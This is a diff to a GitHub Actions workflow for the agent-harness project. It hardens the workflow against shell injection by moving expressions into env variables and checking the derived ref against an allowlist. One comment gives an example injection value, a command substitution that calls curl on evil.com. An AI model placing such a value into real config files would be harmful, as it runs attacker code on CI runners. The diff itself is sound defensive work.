@@ -26,34 +26,48 @@ jobs:
         with:
           node-version: '20'
       - id: derive-ref
-        name: Derive harness CLI ref from harness.config.json
-        # Self-host fallback (CS12 R1+R2 gate fix): if version is empty or the
-        # placeholder "0.0.0-pre" AND the running repo is henrik-me/agent-harness
-        # itself, use ${{ github.sha }} (a valid agent-harness commit SHA). For
-        # any OTHER repo with an unresolvable version, fail LOUDLY — github.sha
-        # there would be the consumer's commit SHA, NOT an agent-harness ref,
-        # and `npx github:henrik-me/agent-harness#<consumer-sha>` would fail
-        # with a confusing "Could not resolve" error.
+        name: Derive + validate harness CLI ref from harness.config.json
+        # CS12 R2 (gate fix): self-host fallback to ${{ github.sha }} when
+        # version is empty/`0.0.0-pre` AND repo is henrik-me/agent-harness.
+        # Other repos with unresolvable version fail loudly.
+        # CS12 R1 (PR #48 review): pass GitHub expressions through env: AND
+        # validate the derived ref against an allowlist regex BEFORE exporting
+        # as a step output. Direct interpolation into a `run:` shell would
+        # allow shell-injection (e.g. version=$(curl evil.com)).
+        env:
+          GH_REPO: ${{ github.repository }}
+          GH_SHA: ${{ github.sha }}
         run: |
           version=$(node -e "console.log(JSON.parse(require('fs').readFileSync('harness.config.json','utf8')).version || '')")
           if [ -n "$version" ] && [ "$version" != "0.0.0-pre" ]; then
             ref="$version"
             echo "Using harness.config.json version ref: $ref"
-          elif [ "${{ github.repository }}" = "henrik-me/agent-harness" ]; then
-            ref="${{ github.sha }}"
+          elif [ "$GH_REPO" = "henrik-me/agent-harness" ]; then
+            ref="$GH_SHA"
             echo "Using github.sha self-host fallback: $ref"
           else
             echo "ERROR: harness.config.json version is empty or '0.0.0-pre' but this is not the henrik-me/agent-harness repo." >&2
             echo "ERROR: Pin a real semver tag (e.g. 'v0.1.0'), branch name, or 40-char SHA in harness.config.json 'version'." >&2
             exit 1
           fi
+          # Allowlist: alphanumeric, dot, underscore, slash, hyphen.
+          # Covers semver tags, branch names, and 40-char SHAs. Rejects shell
+          # metacharacters ($ ` " ' ; & | < > whitespace, etc.).
+          if ! printf '%s' "$ref" | grep -Eq '^[a-zA-Z0-9._/-]+$'; then
+            echo "ERROR: ref \"$ref\" contains characters outside the allowlist [a-zA-Z0-9._/-]." >&2
+            echo "ERROR: Refusing to interpolate into shell — see CS12 R1 PR review for shell-injection rationale." >&2
+            exit 1
+          fi
           echo "ref=$ref" >> "$GITHUB_OUTPUT"
       - id: check-drift
         name: Check for drift
         # Capture exit code explicitly. set +e so the script can branch on rc.
+        # Pass validated ref via env: (R1 PR review fix).
+        env:
+          CLI_REF: ${{ steps.derive-ref.outputs.ref }}
         run: |
           set +e
-          npx -y "github:henrik-me/agent-harness#${{ steps.derive-ref.outputs.ref }}" sync --mode=check --cwd .
+          npx -y "github:henrik-me/agent-harness#${CLI_REF}" sync --mode=check --cwd .
           rc=$?
           set -e
           if [ "$rc" -eq 0 ]; then
@@ -68,7 +82,9 @@ jobs:
           fi
       - name: Apply drift fix
         if: steps.check-drift.outputs.drift_detected == 'true'
-        run: npx -y "github:henrik-me/agent-harness#${{ steps.derive-ref.outputs.ref }}" sync --mode=apply --cwd .
+        env:
+          CLI_REF: ${{ steps.derive-ref.outputs.ref }}
+        run: npx -y "github:henrik-me/agent-harness#${CLI_REF}" sync --mode=apply --cwd .
       - name: Open PR
         if: steps.check-drift.outputs.drift_detected == 'true'
         uses: peter-evans/create-pull-request@5f6978faf089d4d20b00c7766989d076bb2fc7f1  # v8.1.1 as of 2026-05-04
